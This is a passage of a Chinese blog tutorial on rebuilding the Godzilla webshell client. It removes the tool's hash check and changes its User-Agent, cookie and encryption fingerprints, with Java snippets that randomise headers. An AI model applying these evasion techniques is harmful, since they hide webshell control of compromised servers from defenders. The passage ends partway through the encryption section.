<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Ro0ki1">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://ro0ki1.github.io/2025/03/17/godzilla二次开发学习/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:type" content="article">
<meta property="og:title" content="Godzilla二次开发">
<meta property="og:url" content="https://ro0ki1.github.io/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Ro0ki1">
<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ro0ki1.github.io/images/redefine-og.webp">
<meta property="article:published_time" content="2025-03-17T07:56:51.000Z">
<meta property="article:modified_time" content="2025-03-25T06:44:11.972Z">
<meta property="article:author" content="Ro0ki1">
<meta property="article:tag" content="工具二次开发">
<meta property="article:tag" content="godzilla">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ro0ki1.github.io/images/redefine-og.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/image/horse.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/image/horse.jpg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/image/horse.jpg">
    <!--- Page Info-->
    
    <title>
        
            Godzilla二次开发 | Ro0ki1
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"ro0ki1.github.io","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ro0ki1的学习之路","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/3/10 11:45:14"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Ro0ki1
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Godzilla二次开发</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/image/cat.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">Ro0ki1</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-03-17 15:56:51</span>
        <span class="mobile">2025-03-17 15:56:51</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-03-25 14:44:11</span>
            <span class="mobile">2025-03-25 14:44:11</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/">工具二次开发</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/">工具二次开发</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/godzilla/">godzilla</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p><em>参考链接</em><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502" >https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="下载godzilla源码并且反编译"><a href="#下载godzilla源码并且反编译" class="headerlink" title="下载godzilla源码并且反编译"></a>下载godzilla源码并且反编译</h3><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla/releases" >https://github.com/BeichenDream/Godzilla/releases<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p>反编译可以使用在线网站反编译</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.decompiler.com/" >https://www.decompiler.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672615872-49e68deb-4ef9-409a-a828-b336eec601eb.png"
                      class="" title="img"
                >

<p> 在线反编译平台把它丢进去就好了</p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>idea创建项目</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672691782-10349508-2b03-452e-98b9-462443d8e45b.png"
                      class="" title="img"
                >

<p>这样子就好了</p>
<p>然后将反编译出来的源码改的顺眼一点的名字改成godzilla</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672747089-5e3ddd04-32fb-4349-ac0a-54181beaef49.png"
                      class="" title="img"
                >

<p>复制这个目录</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672770133-e44ed91b-23e3-41d4-a932-7298f9eda80a.png"
                      class="" title="img"
                >

<p>鼠标选中根目录粘贴即可</p>
<p><em>新建一个lib文件夹</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672849319-5dec5ace-c812-447e-acae-a9f7dd4b17b1.png"
                      class="" title="img"
                >

<p> 将原本的jar下载下来的放进去右键添加为库</p>
<h3 id="配置工件"><a href="#配置工件" class="headerlink" title="配置工件"></a>配置工件</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672891521-4af08076-b409-4b1f-b1f4-ff538eb0eb8c.png"
                      class="" title="img"
                >

<p>项目结构选择工件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672909199-1c932ec3-8e03-4fde-b786-5f300537c3a3.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672922973-a2283f3e-5471-43f9-987d-8f7ae9a98d76.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672939050-5d6d2bbb-42fe-49f3-9405-8f0ec0d6f9dc.png"
                      class="" title="img"
                >

<p> 选中即可</p>
<h2 id="二次开发的步骤"><a href="#二次开发的步骤" class="headerlink" title="二次开发的步骤"></a>二次开发的步骤</h2><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673014484-20939626-e7d7-44a8-ab89-55e7517afc67.png"
                      class="" title="img"
                >

<p>此时src目录是空的</p>
<p>因为哥斯拉有个本身的哈希校验，所以我们得把那段代码注释掉</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673423776-9d4bd7a0-0faa-4498-b91c-6af383e2f4f2.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673107471-bd45cabe-aea6-4cb8-9fa3-591db8c0573e.png"
                      class="" title="img"
                >

<p>就是这个地方需要更改，所以我们需要按照目录结构把applicationconfig.java部署到src目录下</p>
<p><strong>原本的目录godzilla&#x2F;core&#x2F;ApplicationConfig.java</strong></p>
<p><strong>现在的目录src&#x2F;core&#x2F;ApplicationConfig.java</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673212453-e1e3e52c-51f1-4165-a0f5-c6f0dd8c3e8a.png"
                      class="" title="img"
                >

<p> 只有在src目录下更改的代码才有用！！！</p>
<h3 id="构建代码并运行"><a href="#构建代码并运行" class="headerlink" title="构建代码并运行"></a>构建代码并运行</h3><p>然后我们构建代码并运行即可</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673245542-fa40d05a-6094-41c4-ab9e-b456958e8f87.png"
                      class="" title="img"
                >

<p>补充这个地方需要勾选上<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673277351-c2222fb9-6e69-4420-8ac8-9373e7a01b01.png"
                      class="" title="img"
                ></p>
<p>此时就生成了我们修改后的jar</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673323996-f078c5e4-e0dd-45f3-9562-4c347e04f396.png"
                      class="" title="img"
                >

<p>成功运行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673341785-376adfdb-046e-4135-835f-ee07e2bca1e3.png"
                      class=""
                > 

<h2 id="header特征修改"><a href="#header特征修改" class="headerlink" title="header特征修改"></a>header特征修改</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>哥斯拉有个明显的特征</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673728998-51394f37-6aa2-4500-abee-58b5b2fc5a0b.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673670980-0bf8bb3a-4ab5-4520-8d66-f90449a2d215.png"
                      class=""
                > 

<h3 id="修改特征"><a href="#修改特征" class="headerlink" title="修改特征"></a>修改特征</h3><p><em>tips</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724466501-e8e30bfb-c87d-4afe-9761-4aa879cc44e5.png"
                      class="" title="img"
                >

<p>生成我们的测试木马的时候要选择带有base64的，因为aes加密是二进制的，所以我们burp里面会是乱码</p>
<h4 id="aes数据包"><a href="#aes数据包" class="headerlink" title="aes数据包"></a>aes数据包</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724533073-af561f86-d2fd-4cdb-b874-329c5f62f648.png"
                      class="" title="img"
                >

<h4 id="base64数据包"><a href="#base64数据包" class="headerlink" title="base64数据包"></a>base64数据包</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724550430-41513145-6fe6-49b4-88fc-1774d40170f5.png"
                      class="" title="img"
                > 

<h3 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h3><p>通过全局搜索发现accept和ua头的配置都在这里</p>
<p>godzilla&#x2F;core&#x2F;ui&#x2F;component&#x2F;frame&#x2F;ShellSetting.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673951489-bab984cc-c656-4138-8d62-392a80d92f23.png"
                      class="" title="img"
                >

<p>所以我们就更换到src目录下给他来个ua列表随机生成</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674040720-9406fcaa-5a6f-4c1a-b9ef-aa40f6f1e7fb.png"
                      class="" title="img"
                >

<p>修改的部份</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674101079-194adbbe-b956-4a00-9edd-e8f8d24ec1e3.png"
                      class="" title="img"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; userAgentList = Arrays.asList(</span><br><span class="line">                &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span><br><span class="line">        );</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        String randomUserAgent = userAgentList.get(random.nextInt(userAgentList.size()));</span><br></pre></td></tr></table></figure></div>

<p>构建目录运行即可</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724295269-2eba20cb-d20e-49e9-adcd-505313ff8117.png"
                      class="" title="img"
                >

<p>此时UA特征已经改变了</p>
<h3 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h3><p>godzilla&#x2F;util&#x2F;http&#x2F;HttpResponse.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674273595-78d1862c-ca81-4fcb-a10c-d0889f458b6c.png"
                      class="" title="img"
                >

<p>把这个点直接丢给gpt更改了，要求最后一个cookies的时候不要分号</p>
<p>src&#x2F;util&#x2F;http&#x2F;HttpResponse.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674485823-ea0928b2-9adb-46d4-9767-517314fe6221.png"
                      class="" title="img"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">protected void handleHeader(Map&lt;String, List&lt;String&gt;&gt; map) &#123;</span><br><span class="line">    this.headerMap = map;</span><br><span class="line">    try &#123;</span><br><span class="line">        this.message = map.get(null).get(0);</span><br><span class="line">        Http http = this.shellEntity.getHttp();</span><br><span class="line">        http.getCookieManager().put(http.getUri(), map);</span><br><span class="line">        http.getCookieManager().getCookieStore().get(http.getUri());</span><br><span class="line">        </span><br><span class="line">        List&lt;HttpCookie&gt; cookies = http.getCookieManager().getCookieStore().get(http.getUri());</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        </span><br><span class="line">        // 遍历cookies并拼接</span><br><span class="line">        for (int i = 0; i &lt; cookies.size(); i++) &#123;</span><br><span class="line">            HttpCookie cookie = cookies.get(i);</span><br><span class="line">            sb.append(String.format(&quot;%s=%s&quot;, cookie.getName(), cookie.getValue()));</span><br><span class="line">            // 如果不是最后一个cookie，加上分号和空格</span><br><span class="line">            if (i &lt; cookies.size() - 1) &#123;</span><br><span class="line">                sb.append(&quot;; &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 如果有cookie，添加到headers中</span><br><span class="line">        if (sb.length() &gt; 0) &#123;</span><br><span class="line">            this.shellEntity.getHeaders().put(&quot;Cookie&quot;, sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724334378-367cdd49-e8d9-459f-836f-0f41069efb56.png"
                      class="" title="img"
                >

<p> 已经没有分号</p>
<h2 id="修改请求包的加密方式（初学AES-2次base64）"><a href="#修改请求包的加密方式（初学AES-2次base64）" class="headerlink" title="修改请求包的加密方式（初学AES+2次base64）"></a>修改请求包的加密方式（初学AES+2次base64）</h2><p>我们现在默认使用的是AES+Base64，那我们初步学习，可以使用AES+Base64+Base64去了解加解密的步骤，以及如果我们要自主添加加解密的时候需要哪些步骤</p>
<h3 id="分析加密部分目录结构"><a href="#分析加密部分目录结构" class="headerlink" title="分析加密部分目录结构"></a>分析加密部分目录结构</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160549894.png"
                      class="" title="image-20250317160549894"
                > 

<p>这里面可以观摩下代码</p>
<h4 id="Generate-class"><a href="#Generate-class" class="headerlink" title="Generate.class"></a>Generate.class</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160621637.png"
                      class="" title="image-20250317160621637"
                > 

<p>大概了解代码可以知道这里是生成webshell文件的。里面的参数或者文件类型可以结合上面的shell.jsp以及base64code.bin相关文件了解</p>
<h4 id="JavaAesBase64-class"><a href="#JavaAesBase64-class" class="headerlink" title="JavaAesBase64.class"></a>JavaAesBase64.class</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161846907.png"
                      class="" title="image-20250317161846907"
                > 

<p>初始化的步骤</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161911906.png"
                      class="" title="image-20250317161911906"
                > 

<p>加解密的步骤。</p>
<p>可以思考一下是否可以在此加密地方多加一次base64加密</p>
<ul>
<li>客户端多base64一次，那服务端jsp代码解密的时候也要多解密一次base64。</li>
